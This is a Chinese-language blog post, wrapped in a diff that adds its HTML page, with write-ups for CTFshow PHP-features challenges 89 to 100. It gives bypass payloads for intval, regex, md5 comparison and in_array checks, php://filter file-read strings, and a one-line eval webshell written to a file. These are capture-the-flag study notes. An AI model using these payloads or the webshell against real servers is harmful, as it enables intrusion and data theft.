@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"jingdaqiang.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="写在前面国赛分区赛以AWD的形式进行，始料未及，所以改变突击计划，开始在CTFshow寻求补强。 希望在分区赛到来时，成为wustais的WEB（夸下海口）最强 php特性89、数组正则绕过表达式：12返回值返回完整匹配次数（可能是0），或者如果发生错误返回FALSE。 如果不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if，达到绕过的效果。 90、92-95、intval(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php特性">
+<meta property="og:url" content="https://jingdaqiang.github.io/2021/04/27/php%E7%89%B9%E6%80%A7/index.html">
+<meta property="og:site_name" content="Daq1ang">
+<meta property="og:description" content="写在前面国赛分区赛以AWD的形式进行，始料未及，所以改变突击计划，开始在CTFshow寻求补强。 希望在分区赛到来时，成为wustais的WEB（夸下海口）最强 php特性89、数组正则绕过表达式：12返回值返回完整匹配次数（可能是0），或者如果发生错误返回FALSE。 如果不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if，达到绕过的效果。 90、92-95、intval(">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-04-27T08:57:35.000Z">
+<meta property="article:modified_time" content="2021-04-28T11:19:51.251Z">
+<meta property="article:author" content="六公子买单">
+<meta property="article:tag" content="CTF &amp; CTFshow">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://jingdaqiang.github.io/2021/04/27/php%E7%89%B9%E6%80%A7/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>php特性 | Daq1ang</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Daq1ang</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/04/27/php%E7%89%B9%E6%80%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          php特性
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-04-27 16:57:35" itemprop="dateCreated datePublished" datetime="2021-04-27T16:57:35+08:00">2021-04-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-04-28 19:19:51" itemprop="dateModified" datetime="2021-04-28T19:19:51+08:00">2021-04-28</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>国赛分区赛以AWD的形式进行，始料未及，所以改变突击计划，开始在CTFshow寻求补强。</p>
+<p>希望在分区赛到来时，成为wustais的WEB（夸下海口）最强</p>
+<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="89、数组正则绕过表达式："><a href="#89、数组正则绕过表达式：" class="headerlink" title="89、数组正则绕过表达式："></a>89、数组正则绕过表达式：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">返回值</span><br><span class="line">返回完整匹配次数（可能是0），或者如果发生错误返回FALSE。</span><br></pre></td></tr></table></figure>
+<p>如果不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if，达到绕过的效果。</p>
+<h3 id="90、92-95、intval-函数语法："><a href="#90、92-95、intval-函数语法：" class="headerlink" title="90、92-95、intval()函数语法："></a>90、92-95、intval()函数语法：</h3><blockquote>
+<p>int intval ( mixed $var [, int $base = 10 ] )：<br>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。</p>
+<p>intval在处理数据时，只读取字母前面的数据//弱类型比较</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">intval(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line">intval(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line">intval(<span class="string">&#x27;42&#x27;</span>);                    <span class="comment">// 42</span></span><br><span class="line">intval(<span class="string">&#x27;+42&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line">intval(<span class="string">&#x27;-42&#x27;</span>);                   <span class="comment">// -42</span></span><br><span class="line">intval(<span class="number">042</span>);                     <span class="comment">// 34   8进制</span></span><br><span class="line">intval(<span class="string">&#x27;042&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line">intval(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line">intval(<span class="string">&#x27;1e10&#x27;</span>);                  <span class="comment">// 1</span></span><br><span class="line">intval(<span class="number">0x1A</span>);                    <span class="comment">// 26   16进制</span></span><br></pre></td></tr></table></figure>
+<p>由此得绕过手法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">4476.1</span>  <span class="comment">//整数用小数float绕过</span></span><br><span class="line">?num=<span class="number">4476</span>e	<span class="comment">//intval遇到字符会停止，可以在后面加一个字符绕过</span></span><br><span class="line">?num=%<span class="number">204476</span>   <span class="comment">//intval第一位如果遇到空格会默认继续读取，在前面加一个空格绕过</span></span><br><span class="line">?num=<span class="number">0x117c</span>  <span class="comment">// 16进制</span></span><br><span class="line">?num=<span class="number">010574</span>  <span class="comment">// 8进制</span></span><br><span class="line">?num=+<span class="number">4476</span>	<span class="comment">//正负号</span></span><br><span class="line">?num=<span class="number">4476e0</span>	<span class="comment">//科学计数法</span></span><br></pre></td></tr></table></figure>
+<h2 id="91、正则表达式修饰符"><a href="#91、正则表达式修饰符" class="headerlink" title="91、正则表达式修饰符"></a>91、正则表达式修饰符</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;  <span class="comment">//多行匹配出现php</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;		<span class="comment">//单行匹配不出现php</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>^：匹配字符串开始的位置<br>$：匹配字符串结束的位置</p>
+<p>常见修饰符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">i </span><br><span class="line">不区分(ignore)大小写</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">多(more)行匹配</span><br><span class="line">若存在换行\n并且有开始^或结束$符的情况下，</span><br><span class="line">将以换行为分隔符，逐行进行匹配</span><br><span class="line">$str &#x3D; &quot;abc\nabc&quot;;  &#x2F;&#x2F;两行abc</span><br><span class="line">$preg &#x3D; &quot;&#x2F;^abc$&#x2F;m&quot;;		&#x2F;&#x2F;是多行abc吗</span><br><span class="line">preg_match($preg, $str,$matchs);</span><br><span class="line">这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">特殊字符圆点 . 中包含换行符</span><br><span class="line">默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符</span><br><span class="line">$str &#x3D; &quot;abggab\nacbs&quot;;</span><br><span class="line">$preg &#x3D; &quot;&#x2F;b.&#x2F;s&quot;;</span><br><span class="line">preg_match_all($preg, $str,$matchs);</span><br><span class="line">这样匹配到的有三个 bg b\n bs</span><br><span class="line"></span><br><span class="line">g</span><br><span class="line">全局匹配，查找所有匹配项</span><br><span class="line"></span><br><span class="line">A</span><br><span class="line">强制从目标字符串开头匹配;</span><br><span class="line"></span><br><span class="line">D</span><br><span class="line">如果使用$限制结尾字符,则不允许结尾有换行; </span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这题需要在多行匹配时出现php，但在单行匹配时不能出现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;%0aphp		&#x2F;&#x2F;用换行符%0a：第二行有php绕第一层过滤，有一行无php绕第二层过滤</span><br></pre></td></tr></table></figure>
+<h3 id="highlight-file函数"><a href="#highlight-file函数" class="headerlink" title="highlight_file函数"></a>highlight_file函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);   <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>文件包含de细节</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?u&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php		&#x2F;&#x2F;绝对路径</span><br><span class="line">?u&#x3D;.&#x2F;flag.php &#x2F;&#x2F; .&#x2F;表示上一层目录    相对路径</span><br><span class="line">?u&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br><span class="line">?u&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br><span class="line">?u&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php	</span><br></pre></td></tr></table></figure>
+<h3 id="97、php中hash比较缺陷"><a href="#97、php中hash比较缺陷" class="headerlink" title="97、php中hash比较缺陷:"></a>97、php中hash比较缺陷:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])		<span class="comment">//弱碰撞</span></span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))		<span class="comment">//强比较</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>a不等于b ，但是a和b经md5处理后的值相等</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[POST]</span><br><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2  &#x2F;&#x2F;数组绕过：md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是强相等的。</span><br><span class="line"></span><br><span class="line">[POST]</span><br><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">	&#x2F;&#x2F;强碰撞</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;(string)$a;</span><br><span class="line">$b&#x3D;(string)$b;</span><br><span class="line">if(  ($a!&#x3D;&#x3D;$b) &amp;&amp; (md5($a)&#x3D;&#x3D;md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。</span><br><span class="line">payload: a&#x3D;QNKCDZO&amp;b&#x3D;240610708</span><br></pre></td></tr></table></figure>
+<h3 id="98、三目运算-变量覆盖"><a href="#98、三目运算-变量覆盖" class="headerlink" title="98、三目运算+变量覆盖"></a>98、三目运算+变量覆盖</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;		&#x2F;&#x2F;如果get传了一个值，那么就可以用post覆盖get中的值。</span><br><span class="line">$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;</span><br><span class="line">$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;;</span><br><span class="line">highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);	&#x2F;&#x2F;如果get传了一个HTTP_FLAG&#x3D;flag就输出flag否则显示index.php源码</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>get随便传一个，然后post传 HTTP_FLAG=flag即可</p>
+<p>payload get：1=1 post：HTTP_FLAG=flag</p>
+<h3 id="99、"><a href="#99、" class="headerlink" title="99、"></a>99、</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$allow &#x3D; array();  &#x2F;&#x2F; 声明一个数组</span><br><span class="line">&#x2F;&#x2F; 循环 </span><br><span class="line">for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123;  </span><br><span class="line">	&#x2F;&#x2F; 在数组末尾添加随机数</span><br><span class="line">    array_push($allow, rand(1,$i));</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;  &#x2F;&#x2F; 判断n是否在数组allow中，不进行类型的比较。</span><br><span class="line">	&#x2F;&#x2F;file_put_contents() 函数把一个字符串写入文件中。</span><br><span class="line">    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>n=1.php  //会被当做666进行判断，存在于数组中<br>// 写入1.php的内容为：<br>content=<?php eval($_POST[ctfshow])?>   //进后台找flag<br>// 因为每次添加随机数都有存在1的可能，所以1的概率最大</p>
+<p>弱类型比较</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$allow &#x3D; array(1,&#39;2&#39;,&#39;3&#39;);       &#x2F;&#x2F;弱类型比较：1&#x3D;1.php</span><br><span class="line">var_dump(in_array(&#39;1.php&#39;,$allow));</span><br><span class="line">返回的为true</span><br><span class="line"></span><br><span class="line">$allow &#x3D; array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;);</span><br><span class="line">var_dump(in_array(&#39;1.php&#39;,$allow));</span><br><span class="line">返回false</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="100、"><a href="#100、" class="headerlink" title="100、"></a>100、</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">&#x2F;&#x2F;flag in class ctfshow;</span><br><span class="line">$ctfshow &#x3D; new ctfshow();</span><br><span class="line">$v1&#x3D;$_GET[&#39;v1&#39;];</span><br><span class="line">$v2&#x3D;$_GET[&#39;v2&#39;];</span><br><span class="line">$v3&#x3D;$_GET[&#39;v3&#39;];</span><br><span class="line">$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v0)&#123;</span><br><span class="line">    if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v2))&#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v3))&#123;</span><br><span class="line">            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由逻辑运算符优先级比较<a target="_blank" rel="noopener" href="https://blog.csdn.net/asty9000/article/details/80652064">https://blog.csdn.net/asty9000/article/details/80652064</a></p>
+<p>得只要v1为数字就有v0=1</p>
+<p>介绍反射类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ReflectionClass(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getConstants());  获取一组常量</span><br><span class="line">输出</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getName());    获取类名</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getStaticProperties()); 获取静态属性</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getMethods()); 获取类中的方法</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
